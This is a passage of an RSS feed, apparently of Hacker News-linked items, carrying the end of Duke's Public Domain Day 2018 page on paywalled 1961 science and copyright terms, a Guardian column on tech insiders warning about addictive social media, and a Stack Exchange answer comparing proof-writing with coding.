&lt;p&gt;&lt;img alt=&quot;Aliens: Humans have been searching for us! Cool! How do we contact them? ... I don't know, these articles are behind paywalls.&quot; src=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/contacting-earth.png&quot; /&gt;1961 was another noteworthy year for science, including foundational developments in the search for extraterrestrial intelligence (SETI). Frank Drake developed the &lt;a href=&quot;https://en.wikipedia.org/wiki/Drake_equation&quot; target=&quot;_blank&quot;&gt;Drake equation&lt;/a&gt; for estimating the likelihood of finding extraterrestrial civilizations in the Milky Way. And while other researchers were focused on detecting alien communication via radio signals, Charles H. Townes and R.N. Schwartz suggested that aliens might also communicate using optical masers in their article “&lt;a href=&quot;https://www.nature.com/articles/190205a0.pdf&quot; target=&quot;_blank&quot;&gt;Interstellar and Interplanetary Communication by Optical Masers&lt;/a&gt;,” published in the journal &lt;em&gt;Nature&lt;/em&gt;. But if you want to read that article, and you do not have a subscription or institutional access, you will encounter a paywall. The same is true for other articles from the same issue of &lt;em&gt;Nature&lt;/em&gt; such as “&lt;a href=&quot;https://www.nature.com/articles/190224a0&quot; target=&quot;_blank&quot;&gt;Dynamics and Energetics of Swimming in Water-Beetles&lt;/a&gt;” or “&lt;a href=&quot;https://www.nature.com/articles/190225a0&quot; target=&quot;_blank&quot;&gt;Cosmic Ray Ages of the Treysa and Sikhote–Alin Meteorites&lt;/a&gt;.”&lt;/p&gt;
&lt;p&gt;A distressing number of scientific articles from 1961 require payment or a subscription or account, including those in major journals such as &lt;a href=&quot;http://science.sciencemag.org/content/by/year/1961&quot; target=&quot;_blank&quot;&gt;Science&lt;/a&gt; and &lt;a href=&quot;https://jamanetwork.com/journals/jama/issue/175/1&quot; target=&quot;_blank&quot;&gt;JAMA&lt;/a&gt;,&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn6text&quot;&gt;6&lt;/a&gt; both of which charge &lt;span class=&quot;colortitles&quot;&gt;&lt;em&gt;$30&lt;/em&gt; to view a single article from 1961 for 24 hours&lt;/span&gt;. &lt;span&gt;Want to read a 1961 article about graduate medical education? Here's the &lt;/span&gt;&lt;a href=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/jama_graduate-education.png&quot; onclick=&quot;window.open(this.href, 'JAMAGraduateEducationPaymentPage', 'resizable=yes,status=no,location=no,toolbar=no,menubar=no,fullscreen=no,scrollbars=no,dependent=no,width=934,height=623'); return false;&quot;&gt;payment page&lt;/a&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;Want to read “An Experiment in the History of Science: With a simple but ingenious device Galileo could obtain relatively precise time measurements”? If you go to&lt;/span&gt; &lt;em&gt;Science&lt;/em&gt;&lt;span&gt;’s&lt;/span&gt; &lt;a href=&quot;https://law.duke.edu/sites/default/files/images/centers/cspd/magazine_sciencepaywall1.png&quot; onclick=&quot;window.open(this.href, 'SciencePaymentWindow', 'resizable=yes,status=no,location=no,toolbar=no,menubar=no,fullscreen=no,scrollbars=no,dependent=no,width=934,height=575'); return false;&quot;&gt;&lt;span&gt;page to purchase digital access&lt;/span&gt;&lt;/a&gt;&lt;span&gt;, you will see that you can purchase access for 1 day for $30 US—but that’s not all. You also have to agree to the following restrictions and conditions: “You may view, download, and/or print the article for your personal scholarly, research, and educational use” but may not distribute or post it, and you must agree both to accept cookies and be contacted from time to time about the publisher’s products.&lt;/span&gt; &lt;span&gt;Of course, many scientists will have institutional access to these journals, but this access is not guaranteed—even institutions such as Harvard have considered canceling their subscriptions because they &lt;/span&gt;&lt;a href=&quot;http://www.theguardian.com/science/2012/apr/24/harvard-university-journal-publishers-prices&quot; target=&quot;_blank&quot;&gt;could no longer afford the escalating prices of major journal subscriptions&lt;/a&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;It’s remarkable to find scientific research from 1961 hidden behind publisher paywalls. Thankfully, some publishers have made older articles available in full online, so that you can read them, even though it may still be illegal to copy and distribute them. In addition, some older articles have been made available on third party websites, but this is not a stable solution for providing reliable access to science. Third party postings can be difficult to find or taken down, links can get broken, and would-be posters may be deterred by the risk of a lawsuit. Under the pre-1978 copyright term, all of this history would be free to scholars, students, and enthusiasts.&lt;/p&gt;
&lt;p&gt;Not all scientific publishers work under this kind of copyright scheme. “Open Access” scientific publications, like those of the &lt;a href=&quot;http://www.plos.org/&quot; target=&quot;_blank&quot;&gt;Public Library of Science&lt;/a&gt;, are under &lt;a href=&quot;http://creativecommons.org/&quot; target=&quot;_blank&quot;&gt;Creative Commons&lt;/a&gt; licenses, meaning that they can be copied freely from the day they are published.&lt;/p&gt;
&lt;h3 class=&quot;green&quot;&gt;Works from 1989!&lt;/h3&gt;
&lt;p&gt;Most of the works highlighted here are famous—that is why we included them. And if that fame meant that the work was still being exploited commercially 28 years after its publication, the rights holders would probably renew the copyright. But we know from empirical studies that 85% of authors did not renew their copyrights (for books, the number is even higher—93% did not renew), since most works exhaust their commercial value very quickly.&lt;/p&gt;
&lt;p class=&quot;pquote2&quot;&gt;Under the law that existed until 1978 . . . Up to 85% of all copyrighted works from 1989 might have been entering the public domain on January 1, 2018.&lt;/p&gt;
&lt;p&gt;That means that all of these examples from 1961 are only the tip of the iceberg. If the pre-1978 laws were still in effect, we could have seen 85% of the works published in 1989 enter the public domain on January 1, 2018. Imagine what that would mean to our archives, our libraries, our schools and our culture. Such works could be digitized, preserved, and made available for education, for research, for future creators. Instead, they will remain under copyright for decades to come, perhaps even into the next century.&lt;/p&gt;
&lt;p&gt;Perhaps the most troubling aspect of the current copyright term is that in most cases, the cultural harm is not offset by any benefit to an author or rights holder. Unlike the famous works highlighted here, the vast majority of works from 1961 do not retain commercial value,&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn7text&quot;&gt;7&lt;/a&gt; but they are off limits to users who do not want to risk a copyright lawsuit. This means that &lt;em&gt;&lt;strong&gt;no one&lt;/strong&gt; is benefiting from continued copyright, while the works remain both commercially unavailable and culturally off limits. The public loses the possibility of meaningful access for no good reason.&lt;/em&gt; You can read more about the current costs associated with &lt;a href=&quot;https://law.duke.edu/cspd/orphanworks/&quot; target=&quot;_blank&quot;&gt;orphan works&lt;/a&gt;—works that are still presumably under copyright, but with no identifiable or locatable copyright holder—&lt;a href=&quot;http://chronicle.com/article/Out-of-Fear-Institutions-Lock/127701/&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.abajournal.com/magazine/article/a_trove_of_historic_jazz_recordings_has_found_a_home_in_harlem_but_you_cant&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;. Importantly, the US Copyright Office has been engaged in &lt;a href=&quot;http://www.copyright.gov/orphan/&quot; target=&quot;_blank&quot;&gt;efforts to find solutions to the orphan works problem.&lt;/a&gt; However, unlike other countries, the US has not enacted any such solutions.&lt;/p&gt;
&lt;hr /&gt;&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn1ref&quot;&gt;1&lt;/a&gt; The copyright term for works published between 1950 and 1963 was extended to 95 years from the date of publication, so long as the works were published with a copyright notice and the term renewed (which is generally the case with famous works such as those we are highlighting).&lt;br /&gt;     Many works published in 1961 are already in the public domain because the copyright holder did not comply with notice, renewal, or other copyright formalities. However, tracking down this information can be difficult (you can read just one of many illustrative examples collected by the Copyright Office &lt;a href=&quot;http://www.copyright.gov/orphan/comments/OW0676-AHA.pdf&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;). Therefore, users often have to presume these works are copyrighted or risk a lawsuit (only works published before 1923 are conclusively in the public domain). You can read more about copyright terms from this excellent &lt;a href=&quot;http://copyright.cornell.edu/resources/publicdomain.cfm&quot; target=&quot;_blank&quot;&gt;chart&lt;/a&gt; and from the US Copyright Office’s &lt;a href=&quot;http://www.copyright.gov/circs/circ15a.pdf&quot; target=&quot;_blank&quot;&gt;guide&lt;/a&gt;.&lt;br /&gt;     It is also difficult to determine whether foreign works are in the public domain in the U.S. Generally speaking, as a result of international agreements, foreign works published after 1923 are still under copyright in the US as long as one of the following is true: they were published in compliance with US formalities, they were still copyrighted in their home countries as of 1996, or they were then published in the US within 30 days of publication abroad. You can learn more about copyright terms for foreign works from the Copyright Office guide &lt;a href=&quot;http://www.copyright.gov/circs/circ38b.pdf&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn2ref&quot;&gt;2&lt;/a&gt; If you think publishers have not objected to this, you would be wrong. US copyright law has an exception that allows books to be reproduced in accessible formats, but this exception only applies to “authorized entities”—nonprofits or governmental agencies with a primary mission related to providing such services.&lt;/p&gt;
&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn3ref&quot;&gt;3&lt;/a&gt; The law allows libraries and archives (not preservationists generally) to digitize works during the last 20 years of their copyright term, but only in limited circumstances: the library or archive first has to determine through a “reasonable investigation” that the work is not being commercially exploited &lt;em&gt;and&lt;/em&gt; that they cannot obtain another copy of it at a reasonable price.&lt;/p&gt;
&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn4ref&quot;&gt;4&lt;/a&gt; Under federal law at the time, these “musical compositions”—the music and lyrics—were subject to copyright, but the particular “sound recordings” embodying the musical compositions were not; federal copyright did not cover sound recordings until 1972. (Pre-1972 sound recordings are protected under some states' laws.) So, for example, the musical composition “It's Now or Never” written by Wally Gold and Aaron Schroeder would be federally copyrighted, but not Elvis Presley's particular sound recording of that composition.&lt;/p&gt;
&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn5ref&quot;&gt;5&lt;/a&gt; While we were able to find copyright renewals for all of the books, movies, and songs mentioned on this page (meaning that they are in fact copyrighted through 2057), we weren’t able to track down a renewal for “Look Mickey!” This doesn’t mean it’s not copyrighted — Lichtenstein’s estate has made copyright claims over other works in the past — just that we couldn’t locate the renewal in the Copyright Office database (as explained above, this can sometimes be difficult).&lt;/p&gt;
&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn6ref&quot;&gt;6&lt;/a&gt; Sometimes you can see the first archived journal article you choose, but the remaining articles are behind a paywall. And even when 1961 articles are readable, they’re still copyrighted—these publishers won’t allow you to reproduce or distribute them without permission.&lt;/p&gt;
&lt;p id=&quot;fn&quot;&gt;&lt;a class=&quot;note&quot; href=&quot;https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/#fn7ref&quot;&gt;7&lt;/a&gt; A Congressional Research Service study indicated that only 2% of works between 55 and 75 years old continue to retain commercial value. As explained above, many works from 1961 are technically in the public domain, but it is often difficult to conclusively determine public domain status, so users have to presume that they’re still under copyright.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://creativecommons.org/licenses/by-sa/4.0/&quot; rel=&quot;license&quot;&gt;&lt;img alt=&quot;Creative Commons License&quot; class=&quot;c3&quot; height=&quot;37&quot; hspace=&quot;3&quot; src=&quot;https://i.creativecommons.org/l/by-sa/4.0/88x31.png&quot; /&gt;&lt;/a&gt;The Public Domain Day 2018 web pages by Duke University's &lt;a href=&quot;https://law.duke.edu/cspd/&quot; target=&quot;_blank&quot;&gt;Center for the Study of the Public Domain&lt;/a&gt; are licensed under a &lt;a href=&quot;http://creativecommons.org/licenses/by-sa/4.0/&quot; rel=&quot;license&quot; target=&quot;_blank&quot;&gt;Creative Commons Attribution-ShareAlike 4.0 International License&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Mon, 01 Jan 2018 12:41:05 +0000</pubDate>
<dc:creator>aw3c2</dc:creator>
<og:url>https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/</og:url>
<og:title>Public Domain Day 2018 Pre-1976 | Duke University School of Law</og:title>
<og:description> </og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://law.duke.edu/cspd/publicdomainday/2018/pre-1976/</dc:identifier>
</item>
<item>
<title>Former Google and Facebook execs are sounding alarms about the power of tech</title>
<link>https://www.theguardian.com/commentisfree/2018/jan/01/silicon-valley-eating-soul-google-facebook-tech</link>
<guid isPermaLink="true" >https://www.theguardian.com/commentisfree/2018/jan/01/silicon-valley-eating-soul-google-facebook-tech</guid>
<description>&lt;p&gt;&lt;span class=&quot;drop-cap&quot;&gt;&lt;span class=&quot;drop-cap__inner&quot;&gt;O&lt;/span&gt;&lt;/span&gt;ne source of angst came close to being 2017’s signature subject: how the internet and the tiny handful of companies that dominate it are affecting both individual minds and the present and future of the planet. The old idea of the online world as a burgeoning utopia looks to have peaked around the time of the Arab spring, and is in retreat.&lt;/p&gt;
&lt;p&gt;If you want a sense of how much has changed, picture the president of the US tweeting his latest provocation in the small hours, and consider an array of words and phrases now freighted with meaning: &lt;a href=&quot;https://www.theguardian.com/uk-news/2017/dec/18/russia-linked-twitter-accounts-tried-to-divide-uk-after-terrorist-attacks&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;Russia&lt;/a&gt;, &lt;a href=&quot;https://www.theguardian.com/commentisfree/2017/oct/16/bots-social-media-threaten-democracy-technology&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;bots&lt;/a&gt;, &lt;a href=&quot;https://www.theguardian.com/technology/2017/nov/14/british-mp-calls-on-twitter-to-release-russian-troll-factory-tweets&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;troll farms&lt;/a&gt;, &lt;a href=&quot;https://www.theguardian.com/technology/2016/apr/12/online-abuse-how-harrassment-revenge-pornography-different-countries-deal-with-it&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;online abuse&lt;/a&gt;, &lt;a href=&quot;https://www.theguardian.com/media/2016/dec/18/what-is-fake-news-pizzagate&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;fake news&lt;/a&gt;, &lt;a href=&quot;https://www.theguardian.com/commentisfree/2017/feb/02/corporate-dark-money-power-atlantic-lobbyists-brexit&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;dark money&lt;/a&gt;.&lt;/p&gt;
&lt;aside class=&quot;element element-rich-link element--thumbnail element-rich-link--not-upgraded&quot; data-component=&quot;rich-link&quot; data-link-name=&quot;rich-link-2 | 1&quot;&gt;
&lt;/aside&gt;&lt;p&gt;Another sign of how much things have shifted is a volte-face by Silicon Valley’s most powerful man. Barely more than a year ago the Facebook founder, Mark Zuckerberg, seemed still to be rejoicing in his company’s imperial phase, blithely dismissing the idea that fabricated news carried by his platform had affected the outcome of the 2016 US election as a &lt;a href=&quot;https://www.theguardian.com/technology/2016/nov/10/facebook-fake-news-us-election-mark-zuckerberg-donald-trump&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;“pretty crazy idea”&lt;/a&gt;. Now scarcely a week goes by without some Facebook pronouncement or other, either updating the wider world about its latest quest to put its operations beyond criticism or assuring us that its belief in an eternally upbeat, fuzzily liberal ethos is as fervent as ever.&lt;/p&gt;
&lt;p&gt;The company has reached a fascinating point in its evolution; it is as replete with importance and interest as any political party. Facebook is at once massively powerful and also suddenly defensive. Its deeply questionable tax affairs &lt;a href=&quot;https://www.theguardian.com/technology/2017/dec/12/facebook-ad-revenue-countries-earned-ireland&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;are being altered&lt;/a&gt;; 1,000 new employees have been hired to monitor its advertising. At the same time, it still seems unable to provide any answers to worries about its effects on the world beyond more and more Facebook. &lt;a href=&quot;https://newsroom.fb.com/news/2017/12/hard-questions-is-spending-time-on-social-media-bad-for-us/&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;A pre-Christmas statement claimed&lt;/a&gt; that although “passive” use of social media could harm users, “actively interacting with people” online was linked not just to “improvements in wellbeing”, but to “joy”. In short, if Facebook does your head in, the solution is apparently not to switch off, but more Facebook.&lt;/p&gt;
&lt;aside class=&quot;element element-pullquote element--supporting&quot;&gt;&lt;blockquote&gt;
&lt;p class=&quot;pullquote-paragraph&quot;&gt;Former Facebook president Sean Parker warned that it 'literally changes your relationship with society, with each other'&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/aside&gt;&lt;p&gt;While Zuckerberg and his colleagues do ethical somersaults, there is rising noise from a group of people who made headlines towards the year’s end: the former insiders at tech giants who now loudly worry about what their innovations are doing to us. The former Facebook president Sean Parker &lt;a href=&quot;https://www.theguardian.com/technology/2017/nov/09/facebook-sean-parker-vulnerability-brain-psychology&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;warned in November&lt;/a&gt; that its platform “literally changes your relationship with society, with each other … God only knows what it’s doing to our children’s brains.”&lt;/p&gt;
&lt;p&gt;At around the same time, the former Facebook executive Chamath Palihapitiya held a public interview at Stanford University in which he did not exactly mince his words. “The short-term, dopamine-driven feedback loops that we have created are destroying how society works,” &lt;a href=&quot;https://www.gsb.stanford.edu/insights/chamath-palihapitiya-why-failing-fast-fails&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;he said&lt;/a&gt;. “No civil discourse, no cooperation, misinformation, mistruth … So we are in a really bad state of affairs right now, in my opinion.” (Strangely, around a week later he seemed to recant, claiming he had only meant to “start an important conversation”, and that Facebook was still a company he “loved”.)&lt;/p&gt;
&lt;p&gt;Then there is Tristan Harris, a former high-up at Google who is now hailed as “the closest thing Silicon Valley has to a conscience”. Under the banner of a self-styled “movement” called &lt;a href=&quot;http://www.timewellspent.io/&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;Time Well Spent&lt;/a&gt;, he and his allies are urging software developers to tone down the compulsive elements of their inventions, and the millions who find themselves hooked to change their behaviour.&lt;/p&gt;
&lt;p&gt;What they are up against, meanwhile, is apparently personified by Nir Eyal, a Stanford lecturer and tech consultant who could be a character from the brilliant &lt;a href=&quot;https://www.theguardian.com/tv-and-radio/tvandradioblog/2014/aug/06/silicon-valley-mike-judge-sitcom&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;HBO sitcom Silicon Valley&lt;/a&gt;. In 2013 he published Hooked: How To Build Habit-Forming Products. His inspiration for the book is the behaviourist psychology pioneered by BF Skinner. Among his pearls of wisdom is one both simple and chilling: “For new behaviours to really take hold, they must occur often.” But on close inspection, even he sounds somewhat ambivalent: last April, at something called the Habit Summit, he told his audience that at home he had installed a device that cut off the internet at a set time every day.&lt;/p&gt;
&lt;p&gt;Good for him. The reality for millions of other people is a constant experience that all but buries the online world’s liberating possibilities in a mess of alerts, likes, messages, retweets and internet use so pathologically needy and frantic that it inevitably makes far too many people vulnerable to pernicious nonsense and real dangers.&lt;/p&gt;
&lt;p&gt;Thanks to manipulative ephemera, WhatsApp users anxiously await the ticks that confirm whether a message has been read by a receiver; and, a turbocharged version of the addictive dots that flash on an iPhone when a friend is replying to you, Snapchat now alerts its users when a friend starts typing a message to them. And we all know what lies around the corner: a world of Sensurround virtual reality, and an internet wired into just about every object we interact with. As the repentant Facebookers say: if we’re not careful, we will soon be at risk of being locked into mindless behavioural loops, craving distraction even from other distractions.&lt;/p&gt;
&lt;p&gt;There is a possible way out of this, of course. It resides not in some luddite fantasy of an army of people carrying old Nokia phones and writing each other letters, but the possibility of a culture that actually embraces the idea of navigating the internet with a discriminating sensibility and an emphasis on basic moderation. We now know – don’t we? – that the person who begins most social encounters by putting their phone on the table is either an addict or an idiot.&lt;/p&gt;
&lt;aside class=&quot;element element-rich-link element--thumbnail element-rich-link--not-upgraded&quot; data-component=&quot;rich-link&quot; data-link-name=&quot;rich-link-2 | 2&quot;&gt;
&lt;/aside&gt;&lt;p&gt;There is also a mounting understanding that one of the single most important aspects of modern parenting is to be all too aware of how much social media can mess with people’s minds, and to limit our children’s screen time. This, after all, is what &lt;a href=&quot;https://www.theguardian.com/technology/billgates&quot; data-link-name=&quot;auto-linked-tag&quot; data-component=&quot;auto-linked-tag&quot; class=&quot;u-underline&quot;&gt;Bill Gates&lt;/a&gt; and Steve Jobs did, as evidenced by one of the latter’s most pithy statements. In 2010 he was asked about his children’s opinion of the iPad. “They haven’t used it,” he said. “We limit how much technology our kids use at home.”&lt;/p&gt;
&lt;p&gt;Two billion people actively use Facebook; at least 3.5 billion are now reckoned to be online. Their shared habits, compulsions and susceptibilities will clearly have a huge influence on the world’s progress, or lack of it. So we ought to listen to Tristan Harris and his campaign. “Religions and governments don’t have that much influence over people’s daily thoughts,” &lt;a href=&quot;https://www.wired.com/story/our-minds-have-been-hijacked-by-our-phones-tristan-harris-wants-to-rescue-them/&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;he recently told Wired magazine&lt;/a&gt;. “But we have three technology companies” – he meant Facebook, Google and Apple – “who have this system that frankly they don’t even have control over … Right now, 2 billion people’s minds are already jacked in to this automated system, and it’s steering people’s thoughts toward either personalised paid advertising or misinformation or conspiracy theories. And it’s all automated; the owners of the system can’t possibly monitor everything that’s going on, and they can’t control it.”&lt;/p&gt;
&lt;p&gt;And then came the kicker. “This isn’t some kind of philosophical conversation. This is an urgent concern happening right now.” Amid an ocean of corporate sophistry and doublethink, those words have the distinct ring of truth.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;bullet&quot;&gt;•&lt;/span&gt; John Harris is a Guardian columnist&lt;/p&gt;
</description>
<pubDate>Mon, 01 Jan 2018 11:32:00 +0000</pubDate>
<dc:creator>DrNuke</dc:creator>
<og:url>http://www.theguardian.com/commentisfree/2018/jan/01/silicon-valley-eating-soul-google-facebook-tech</og:url>
<og:description>Former Google and Facebook executives are sounding the alarm about the pervasive power of tech, writes Guardian columnist John Harris</og:description>
<og:image>https://i.guim.co.uk/img/media/aa0909fa601a3e787aaa612245d587b59dd9fcd7/0_0_2560_1536/master/2560.jpg?w=1200&amp;h=630&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=crop&amp;crop=faces%2Centropy&amp;bm=normal&amp;ba=bottom%2Cleft&amp;blend64=aHR0cHM6Ly91cGxvYWRzLmd1aW0uY28udWsvMjAxNy8xMC8wNi9vcGluaW9uc19vdmVybGF5LWZhY2Vib29rLnBuZz90ZXN0&amp;s=ba810e80ceb1309f463be84d70c4d97c</og:image>
<og:type>article</og:type>
<og:title>Take it from the insiders: Silicon Valley is eating your soul | John Harris</og:title>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.theguardian.com/commentisfree/2018/jan/01/silicon-valley-eating-soul-google-facebook-tech</dc:identifier>
</item>
<item>
<title>Why is writing mathematical proofs more fault-proof than writing code? (2011)</title>
<link>https://cs.stackexchange.com/questions/85327/why-is-writing-down-mathematical-proofs-more-fault-proof-than-writing-computer-c</link>
<guid isPermaLink="true" >https://cs.stackexchange.com/questions/85327/why-is-writing-down-mathematical-proofs-more-fault-proof-than-writing-computer-c</guid>
<description>

Let's look at things at the simplest, and most basic level.
&lt;p&gt;For math, we have:&lt;br/&gt;2+3=5&lt;/p&gt;&lt;p&gt;I learned about that when I was very, very young. I can look at the most basic elements: two objects, and three objects. Great.&lt;/p&gt;
&lt;p&gt;For computer programming, most people tend to use a high-level language. Some high-level languages can even &quot;compile&quot; into one of the lower high-level languages, like C. C can then be translated into Assembly language. Assembly language then gets converted into machine code. A lot of people think the complexity ends there, but it doesn't: Modern CPUs take the machine code as instructions, but then run &quot;micro code&quot; to actually execute those instructions.&lt;/p&gt;
&lt;p&gt;This means that, at the most basic level (dealing with the simplest of structures), we are now dealing with micro-code, which is embedded in the hardware and which most programmers don't even use directly, nor update. In fact, not only do most programmers not touch micro code (0 levels higher than micro code), most programmers don't touch machine code (1 level higher than micro code), nor even Assembly (2 levels higher than micro code) (except, perhaps, for a bit of formal training during college). Most programmers will spend time only 3 or more levels higher.&lt;/p&gt;
&lt;p&gt;Furthermore, if we look at Assembly (which is as low level as people typically get), each individual step is typically understandable by people who have been trained and have the resources to interpret that step. In this sense, Assembly is much simpler than a higher level language. However, Assembly is so simple that performing complex tasks, or even mediocre tasks, is very tedious. Upper-level languages free us from that.&lt;/p&gt;
&lt;p&gt;In a law about &quot;reverse engineering&quot;, a judge declared that even if code can theoretically be handled one byte at a time, modern programs involve millions of bytes, so some sorts of records (like copies of code) must be made just for such an effort to be feasible. (Therefore internal development wasn't considered a violation of the generalized &quot;no making copies&quot; rule of copyright law.) (I'm probably thinking of making unauthorized Sega Genesis cartridges, but may be thinking of something said during the Game Genie case.)&lt;/p&gt;

&lt;p&gt;Do you run code meant for 286s? Or do you run 64-bit code?&lt;/p&gt;
&lt;p&gt;Mathematics uses fundamentals that extend back for millennia. With computers, people typically consider investment in something two decades old to be uselessly wasteful of resources. That means Mathematics can be a lot more thoroughly tested.&lt;/p&gt;

&lt;p&gt;I was taught (by a friend who had more formal computer programming training than myself) that there is no such thing as a bug-free C compiler that meets the C specifications. This is because the C language basically assumes the possibility of using infinite memory for the purpose of a stack. Obviously, such an impossible requirement had to be deviated from when people tried to make usable compilers that worked with actual machines that are a bit more finite in nature.&lt;/p&gt;
&lt;p&gt;In practice, I have found that with JScript in Windows Script Host, I've been able to accomplish a lot of good using objects. (I like the environment because the toolset needed to try new code is built into modern versions of Microsoft Windows.) When using this environment, I've found that sometimes there is no easily-findable documentation on how the object works. However, using the object is so beneficial, that I do so anyway. So what I'd do is write code, which may be buggy as a hornet's nest, and do so in a nicely sandboxed environment where I can see the effects, and learn about the object's behaviors while interacting with it.&lt;/p&gt;
&lt;p&gt;In other cases, sometimes only after I've figured out how an object behaves, I've found that the object (bundled with the operating system) is buggy, and that it is a known issue that Microsoft has intentionally decided will not be fixed.&lt;/p&gt;
&lt;p&gt;In such scenarios, do I rely on OpenBSD, created by masterful programmers that create new releases on-schedule, on a regular basis (twice a year), with a famous security record of &quot;only two remote holes&quot; in 10+ years? (Even they have errata patches for less severe issues.) No, by no means. I don't rely on such a product with such higher quality, because I'm working for a business that support businesses that supply people with machines that use Microsoft Windows, so that is what my code needs to work on.&lt;/p&gt;
&lt;p&gt;Practicality/usability require that I work on the platforms that people find useful, and that is a platform which is famously bad for security (even though tremendous improvements have been made from the early days of the millennium which the same company's products were much worse).&lt;/p&gt;

&lt;p&gt;There are numerous reasons why computer programming is more error prone, and that is accepted by the community of computer users. In fact, most code is written in environments which will not tolerate error-free efforts. (Some exceptions, such as developing security protocols, may receive a bit more effort in this regard.) Besides the commonly thought of reasons of businesses not wanting to invest more money, and miss artificial deadlines to make customers happy, there is the impact of the march of technology which simply states that if you spend too much time, you will be working on an obsolete platform because things do change significantly within a decade.&lt;/p&gt;
&lt;p&gt;Offhand, I can recall being surprised at just how short some very useful and popular functions were, when I saw some source code for strlen and strcpy. For instance, strlen may have been something like &quot;int strlen(char *x){char &lt;em&gt;y=x;while (&lt;/em&gt;(y++));return (y-x)-1;}&quot;&lt;/p&gt;
&lt;p&gt;However, typical computer programs are much lengthier than that. Also, a lot of modern programming will use other code which may be less thoroughly tested, or even known to be buggy. Today's systems are much more elaborate than what can easily be thought through, except by hand-waving away a lot of the minutia as &quot;details handled by lower levels&quot;.&lt;/p&gt;
&lt;p&gt;This mandatory complexity, and the certainty of working with complex and even wrong systems, makes computer programming a lot hardware to verify than a lot of mathematics where things tend to boil down to a lot simpler levels.&lt;/p&gt;
&lt;p&gt;When you break things down in mathematics, you get to individual pieces that children can understand. Most people trust math; at least basic arithmetic (or, at least, counting).&lt;/p&gt;
&lt;p&gt;When you really break down computer programming to see what's happening under the hood, you end up with broken implementations of broken standards and code that is ultimately executed electronically, and that physical implementation is just one step below microcode which most university-trained computer scientists don't dare touch (if they are even aware of it).&lt;/p&gt;
&lt;p&gt;I've spoken with some programmers who are in college or recent graduates who outright object to the notion that bug-free code can be written. They've written off the possibility, and though they acknowledge that some impressive examples (which I have been able to show) are some convincing arguments, they consider such samples to be unrepresentative rare flukes, and still dismiss the possibility of being able to count on having such higher standards. (A much, much different attitude than the much more trustable foundation we see in math.)&lt;/p&gt;
</description>
<pubDate>Mon, 01 Jan 2018 10:33:41 +0000</pubDate>
<dc:creator>dgellow</dc:creator>
<og:type>website</og:type>
<og:url>https://cs.stackexchange.com/questions/85327/why-is-writing-down-mathematical-proofs-more-fault-proof-than-writing-computer-c</og:url>
<og:image>https://cdn.sstatic.net/Sites/cs/img/apple-touch-icon@2.png?v=324a3e0c2b03</og:image>
<og:title>Why is writing down mathematical proofs more fault-proof than writing computer code?</og:title>
<og:description>I have noticed that I find it far easier to write down mathematical proofs without making any mistakes, than to write down a computer program without bugs. It seems that this is something more</og:description>
<dc:format>text/html</dc:format>
<dc:identifier>https://cs.stackexchange.com/questions/85327/why-is-writing-down-mathematical-proofs-more-fault-proof-than-writing-computer-c</dc:identifier>
</item>
<item>
<title>You are listening to San Francisco</title>
<link>http://youarelistening.to/sanfrancisco</link>
<guid isPermaLink="true" >http://youarelistening.to/sanfrancisco</guid>
